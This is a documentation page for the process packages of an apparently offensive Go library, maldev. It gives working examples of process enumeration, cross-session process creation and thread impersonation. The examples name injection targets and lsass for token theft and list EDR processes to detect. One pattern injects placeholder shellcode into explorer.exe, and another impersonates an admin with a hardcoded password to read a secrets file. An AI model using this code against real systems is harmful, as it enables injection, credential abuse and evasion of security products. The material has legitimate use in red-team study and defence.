[← Back to README](../README.md)

# Process Management

This page documents the two process-related packages in maldev:

- **`process/enum`** -- Cross-platform process enumeration (Windows + Linux)
- **`process/session`** -- Cross-session process creation and thread impersonation (Windows)

---

## process/enum -- Process Enumeration

Package `enum` provides cross-platform process enumeration with filtering helpers. On Windows it uses the Toolhelp32 snapshot API; on Linux it reads `/proc`.

**MITRE ATT&CK:** T1057 (Process Discovery)
**Platform:** Cross-platform (Windows + Linux)

### Types

#### `Process`

```go
type Process struct {
    PID       uint32 // Process ID
    PPID      uint32 // Parent process ID
    Name      string // Executable name (e.g., "explorer.exe", "sshd")
    SessionID uint32 // Terminal Services session ID (Windows only)
}
```

### Functions

#### `List`

```go
func List() ([]Process, error)
```

**Purpose:** Returns all running processes on the system.

**Returns:** A slice of `Process` structs, or an error if enumeration fails.

**How it works (Windows):**
1. Locks the goroutine to the OS thread (`runtime.LockOSThread`) to prevent Go scheduler interference during the snapshot
2. Creates a process snapshot via `windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)`
3. Iterates with `Process32First` / `Process32Next`, converting the `PROCESSENTRY32.szExeFile` UTF-16 field to a Go string
4. Stops when `ERROR_NO_MORE_FILES` (errno 18) is returned

**How it works (Linux):**
1. Globs `/proc/[0-9]*` to find all PID directories
2. For each PID directory, reads `/proc/<pid>/comm` for the process name
3. Parses `/proc/<pid>/status` for the `PPid:` field

**Example:**

```go
package main

import (
    "fmt"
    "log"

    "github.com/oioio-space/maldev/process/enum"
)

func main() {
    procs, err := enum.List()
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("Found %d processes\n", len(procs))
    for _, p := range procs {
        fmt.Printf("  PID=%5d  PPID=%5d  %s\n", p.PID, p.PPID, p.Name)
    }
}
```

---

#### `FindProcess`

```go
func FindProcess(pred func(name string, pid, ppid uint32) bool) (*Process, error)
```

**Purpose:** Returns the first process matching a custom predicate function. Returns an error if no process matches.

**Parameters:**
- `pred` -- A function that receives the process name, PID, and PPID. Return `true` to select that process.

**How it works:** Calls `List()` and iterates through results, returning the first match.

**When to use:** Finding a specific process by complex criteria (e.g., by name AND parent PID, or by PID range).

**Example:**

```go
package main

import (
    "fmt"
    "log"
    "strings"

    "github.com/oioio-space/maldev/process/enum"
)

func main() {
    // Find the first svchost.exe spawned by services.exe (PID ~700)
    p, err := enum.FindProcess(func(name string, pid, ppid uint32) bool {
        return strings.EqualFold(name, "svchost.exe") && ppid < 1000
    })
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("Found: PID=%d, PPID=%d, Name=%s\n", p.PID, p.PPID, p.Name)
}
```

---

#### `FindByName`

```go
func FindByName(name string) ([]Process, error)
```

**Purpose:** Returns all processes matching the given name (case-insensitive comparison).

**Parameters:**
- `name` -- Process name to search for (e.g., `"explorer.exe"`, `"winlogon.exe"`)

**Returns:** A slice of matching processes (may be empty if none match). Returns an error only if process enumeration itself fails.

**How it works:** Calls `List()` and filters using `strings.EqualFold` for case-insensitive matching.

**When to use:**
- Finding injection targets (e.g., `explorer.exe`, `svchost.exe`)
- Checking if security products are running (e.g., `MsMpEng.exe`, `CrowdStrike.exe`)
- Locating SYSTEM processes for token theft (e.g., `winlogon.exe`, `lsass.exe`)

**Example:**

```go
package main

import (
    "fmt"
    "log"

    "github.com/oioio-space/maldev/process/enum"
)

func main() {
    // Find all explorer.exe instances (one per logged-in user)
    explorers, err := enum.FindByName("explorer.exe")
    if err != nil {
        log.Fatal(err)
    }

    for _, p := range explorers {
        fmt.Printf("explorer.exe PID=%d (session %d)\n", p.PID, p.SessionID)
    }

    // Check for Windows Defender
    defenders, err := enum.FindByName("MsMpEng.exe")
    if err != nil {
        log.Fatal(err)
    }
    if len(defenders) > 0 {
        fmt.Println("Windows Defender is running")
    }
}
```

---

## process/session -- Cross-Session Execution

Package `session` provides utilities for creating processes and impersonating threads in other user sessions. Requires SYSTEM or equivalent privileges.

**MITRE ATT&CK:** T1134.002 (Access Token Manipulation: Create Process with Token)
**Platform:** Windows only
**Prerequisites:** The caller must hold a valid user token (typically obtained via token theft, `LogonUser`, or `DuplicateTokenEx`).

### Functions

#### `CreateProcessOnActiveSessions`

```go
func CreateProcessOnActiveSessions(userToken *token.Token, executable string, args []string) error
```

**Purpose:** Creates a new process in the security context of the specified user token. The process runs in the user's session with their environment variables and working directory.

**Parameters:**
- `userToken` -- A `*token.Token` from the `win/token` package representing the target user. Must have sufficient privileges for `CreateProcessAsUser`.
- `executable` -- Full path to the executable (e.g., `C:\Windows\System32\cmd.exe`)
- `args` -- Command-line arguments

**How it works:**
1. Queries `userToken.UserDetails()` to get the user's profile directory (used as working directory)
2. Creates an environment block via `CreateEnvironmentBlock` from `userenv.dll` using the user's token
3. Calls `windows.CreateProcessAsUser` with the token, executable, args, environment block, and user's profile directory
4. Closes the process and thread handles
5. Destroys the environment block

**When to use:**
- Lateral movement within a multi-user system: run commands in another user's session
- Persistence: start a process under a different user after obtaining their token
- Post-exploitation: execute payloads as a specific domain user

**Example:**

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/process/session"
    "github.com/oioio-space/maldev/win/impersonate"
)

func main() {
    // Assume we have a SYSTEM token from exploit or token theft
    t, err := impersonate.LogonUserW("targetuser", "DOMAIN", "password",
        impersonate.LOGON32_LOGON_INTERACTIVE, impersonate.LOGON32_PROVIDER_DEFAULT)
    if err != nil {
        log.Fatal(err)
    }
    defer t.Close()

    err = session.CreateProcessOnActiveSessions(
        t,
        `C:\Windows\System32\cmd.exe`,
        []string{"/C", "whoami > C:\\temp\\whoami.txt"},
    )
    if err != nil {
        log.Fatal(err)
    }
}
```

---

#### `List`

```go
func List() ([]Info, error)
```

**Purpose:** Enumerates every Terminal Services session on the current
server (console, RDP, services, disconnected sessions, listeners) and
returns each with its user + domain populated.

**Returns:** Slice of `Info` structs.

**How it works:**
1. `WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, …)` returns the
   raw `WTS_SESSION_INFO[]` array (ID, WinStation name, state).
2. For each session, `WTSQuerySessionInformationW` retrieves `WTSUserName`
   and `WTSDomainName` — the logged-on user, if any.
3. `WTSFreeMemory` is called for every allocation (array + each string).

**No elevation required** — WTSEnumerateSessions works from any user
account.

**Example:**

```go
import "github.com/oioio-space/maldev/process/session"

sessions, _ := session.List()
for _, s := range sessions {
    fmt.Printf("id=%d name=%s state=%s user=%s\\%s\n",
        s.ID, s.Name, s.State, s.Domain, s.User)
}
```

Typical output on a single-user Windows 10 box:

```text
id=0 name=Services state=Disconnected user= domain=
id=1 name=Console  state=Active       user=m.bachmann domain=LAPTOP-A1IU4LCG
id=65537 name=RDP-Tcp state=Listen    user= domain=
```

---

#### `Active`

```go
func Active() ([]Info, error)
```

**Purpose:** Convenience filter — `List()` restricted to sessions whose
state is `StateActive` AND whose `User` is non-empty. Excludes the
Services session (ID 0), listeners, and disconnected/locked sessions.

**When to use:**
- Choosing an injection target session (Console vs RDP user).
- Selecting a user to impersonate via `WTSQueryUserToken` + `ImpersonateLoggedOnUser`.
- Auditing logged-in users for a compromise report.

---

### Types

#### `Info`

```go
type Info struct {
    ID     uint32       // session ID: 0 = Services, 1 = Console, 2+ = RDP / fast-user-switch
    Name   string       // WinStation name ("Console", "RDP-Tcp#0", …)
    State  SessionState // connection state
    User   string       // logged-on user, empty for listener / services
    Domain string       // user's domain, empty when User is empty
}
```

#### `SessionState`

Enum mirroring `WTS_CONNECTSTATE_CLASS`:

| Constant              | Value | Meaning                                                                     |
|-----------------------|-------|-----------------------------------------------------------------------------|
| `StateActive`         | 0     | User logged in and interactive on the console.                              |
| `StateConnected`      | 1     | Session has a user but hasn't completed logon.                              |
| `StateConnectQuery`   | 2     | WinStation is accepting a connection request.                               |
| `StateShadow`         | 3     | Session is being shadowed by another one.                                   |
| `StateDisconnected`   | 4     | User was logged in but session is now detached (RDP hang-up, lock screen).  |
| `StateIdle`           | 5     | Session is waiting for a client to connect.                                 |
| `StateListen`         | 6     | Listener endpoint (e.g. `RDP-Tcp`, service transport).                      |
| `StateReset`          | 7     | Session is being reset.                                                     |
| `StateDown`           | 8     | Session is down for reasons other than normal logoff.                       |
| `StateInit`           | 9     | Session is being initialised.                                               |

`SessionState.String()` returns the MSDN-style name.

---

#### `ImpersonateThreadOnActiveSession`

```go
func ImpersonateThreadOnActiveSession(userToken *token.Token, callbackFunc func() error) error
```

**Purpose:** Executes a callback function on a dedicated OS thread impersonating the specified user token. The impersonation is automatically reverted when the callback returns.

**Parameters:**
- `userToken` -- A `*token.Token` representing the user to impersonate
- `callbackFunc` -- Function to execute under the impersonated context. Any error returned is propagated to the caller.

**How it works:**
1. Spawns a new goroutine pinned to a dedicated OS thread via `runtime.LockOSThread`
2. Calls `impersonate.ImpersonateLoggedOnUser` with the user's token handle -- this sets the thread's security context
3. Executes `callbackFunc()` under the impersonated identity
4. Calls `windows.RevertToSelf()` (via deferred) to restore the original thread token
5. Uses `errgroup.Group` to propagate errors from the goroutine back to the caller

**When to use:**
- Performing file system operations as another user (reading their files, writing to their profile)
- Accessing network resources with another user's credentials (SMB shares, etc.)
- Any operation that needs temporary identity switching without creating a new process

**Example:**

```go
package main

import (
    "fmt"
    "log"
    "os"

    "github.com/oioio-space/maldev/process/session"
    "github.com/oioio-space/maldev/win/impersonate"
)

func main() {
    t, err := impersonate.LogonUserW("admin", ".", "P@ssw0rd",
        impersonate.LOGON32_LOGON_INTERACTIVE, impersonate.LOGON32_PROVIDER_DEFAULT)
    if err != nil {
        log.Fatal(err)
    }
    defer t.Close()

    err = session.ImpersonateThreadOnActiveSession(t, func() error {
        // This code runs as "admin"
        data, err := os.ReadFile(`C:\Users\admin\Desktop\secrets.txt`)
        if err != nil {
            return err
        }
        fmt.Println(string(data))
        return nil
    })
    if err != nil {
        log.Fatal(err)
    }
}
```

---

## Common Patterns

### Find a process and inject shellcode

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/inject"
    "github.com/oioio-space/maldev/process/enum"
)

func main() {
    shellcode := []byte{0x90, 0x90, 0xCC} // placeholder

    // Find explorer.exe for injection
    procs, err := enum.FindByName("explorer.exe")
    if err != nil || len(procs) == 0 {
        log.Fatal("explorer.exe not found")
    }

    injector, err := inject.NewInjector(&inject.Config{
        Method: inject.MethodCreateRemoteThread,
        PID:    int(procs[0].PID),
    })
    if err != nil {
        log.Fatal(err)
    }

    if err := injector.Inject(shellcode); err != nil {
        log.Fatal(err)
    }
}
```

### Enumerate processes and check for EDR

```go
package main

import (
    "fmt"
    "log"
    "strings"

    "github.com/oioio-space/maldev/process/enum"
)

func main() {
    edrNames := []string{
        "MsMpEng.exe",      // Windows Defender
        "CSFalconService",  // CrowdStrike
        "cb.exe",           // Carbon Black
        "SentinelAgent",    // SentinelOne
    }

    procs, err := enum.List()
    if err != nil {
        log.Fatal(err)
    }

    for _, p := range procs {
        for _, edr := range edrNames {
            if strings.Contains(strings.ToLower(p.Name), strings.ToLower(edr)) {
                fmt.Printf("EDR detected: %s (PID %d)\n", p.Name, p.PID)
            }
        }
    }
}
```
